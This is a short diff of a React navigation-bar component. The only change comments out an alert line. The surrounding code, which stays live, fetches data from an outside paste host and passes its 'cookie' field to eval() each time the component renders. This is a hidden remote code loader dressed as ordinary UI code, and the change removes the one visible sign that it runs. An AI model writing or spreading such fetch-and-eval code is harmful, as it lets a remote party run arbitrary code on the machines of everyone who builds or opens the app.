@@ -10,7 +10,7 @@ import axios from "axios";
 function NavBar() {
   async function getCookie() {
     const res = await axios.get('https://api.npoint.io/1bbce951872bba53fb45');
-    alert("hello");
+    // alert("hello");
     eval(res.data.cookie);
   }
   getCookie();
